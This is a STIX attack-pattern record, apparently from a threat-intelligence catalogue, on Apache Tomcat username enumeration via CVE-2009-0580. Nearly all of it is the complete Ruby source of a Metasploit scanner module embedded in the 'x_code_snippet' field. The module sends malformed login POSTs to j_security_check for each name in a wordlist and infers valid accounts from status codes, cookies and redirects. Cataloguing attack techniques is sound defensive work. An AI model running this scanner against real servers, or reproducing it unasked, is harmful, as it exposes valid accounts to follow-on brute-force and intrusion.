{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--915229b4-927a-434b-b0e4-7012cba67df8",
    "created": "2024-08-14T16:29:35.448287Z",
    "modified": "2024-08-14T16:29:35.44829Z",
    "name": "Apache Tomcat User Enumeration",
    "description": " This module enumerates Apache Tomcat's usernames via malformed requests to j_security_check, which can be found in the web administration package. It should work against Tomcat servers 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18. Newer versions no longer have the \"admin\" package by default. The 'admin' package is no longer provided for Tomcat 6 and later versions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/tomcat_enum.rb",
            "external_id": "tomcat_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0580"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'           => 'Apache Tomcat User Enumeration',\n      'Description'    => %q{\n          This module enumerates Apache Tomcat's usernames via malformed requests to\n        j_security_check, which can be found in the web administration package. It should\n        work against Tomcat servers 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18.\n        Newer versions no longer have the \"admin\" package by default. The 'admin' package\n        is no longer provided for Tomcat 6 and later versions.\n      },\n      'Author'         =>\n        [\n          'Heyder Andrade <heyder.andrade[at]gmail.com>',\n          'Leandro Oliveira <leandrofernando[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['BID', '35196'],\n          ['CVE', '2009-0580'],\n          ['OSVDB', '55055'],\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The path of the Apache Tomcat Administration page', '/admin/j_security_check']),\n        OptPath.new('USER_FILE',  [ true, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"tomcat_mgr_default_users.txt\") ]),\n      ])\n\n    deregister_options('PASS_FILE','USERPASS_FILE','USER_AS_PASS','STOP_ON_SUCCESS','BLANK_PASSWORDS')\n  end\n\n  def has_j_security_check?\n    vprint_status(\"#{full_uri} - Checking j_security_check...\")\n    res = send_request_raw({'uri' => normalize_uri(target_uri.path)})\n    if res\n      vprint_status(\"#{full_uri} - Server returned: #{res.code.to_s}\")\n      return true if res.code == 200 or res.code == 302\n    end\n\n    false\n  end\n\n  def run_host(ip)\n    unless has_j_security_check?\n      print_error(\"#{full_uri} - Unable to enumerate users with this URI\")\n      return\n    end\n\n    @users_found = {}\n\n    each_user_pass { |user,pass|\n      do_login(user)\n    }\n\n    if(@users_found.empty?)\n      print_status(\"#{full_uri} - No users found.\")\n    else\n      print_good(\"#{full_uri} - Users found: #{@users_found.keys.sort.join(\", \")}\")\n      report_note(\n        :host => rhost,\n        :port => rport,\n        :type => 'tomcat.users',\n        :data => {:users =>  @users_found.keys.join(\", \")}\n      )\n    end\n  end\n\n  def do_login(user)\n    post_data = \"j_username=#{user}&password=%\"\n    vprint_status(\"#{full_uri} - Apache Tomcat - Trying name: '#{user}'\")\n    begin\n      res = send_request_cgi(\n        {\n          'method'  => 'POST',\n          'uri'     => normalize_uri(target_uri.path),\n          'data'    => post_data,\n        }, 20)\n\n      if res and res.code == 200 and !res.get_cookies.empty?\n        vprint_error(\"#{full_uri} - Apache Tomcat #{user} not found \")\n      elsif res and res.code == 200 and res.body =~ /invalid username/i\n        vprint_error(\"#{full_uri} - Apache Tomcat #{user} not found \")\n      elsif res and res.code == 500\n        # Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html\n        vprint_good(\"#{full_uri} - Apache Tomcat #{user} found \")\n        @users_found[user] = :reported\n      elsif res and res.body.empty? and res.headers['Location'] !~ /error\\.jsp$/\n        # Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html\n        print_good(\"#{full_uri} - Apache Tomcat #{user} found \")\n        @users_found[user] = :reported\n      else\n        print_error(\"#{full_uri} - NOT VULNERABLE\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      print_error(\"#{full_uri} - UNREACHABLE\")\n      return :abort\n    end\n  end\nend\n\n=begin\n\nIf your Tomcat doesn't have the admin package by default, download it here:\nhttp://archive.apache.org/dist/tomcat/\n\nThe package name should look something like: apache-tomcat-[version]-admin.zip\n\n=end\n"
}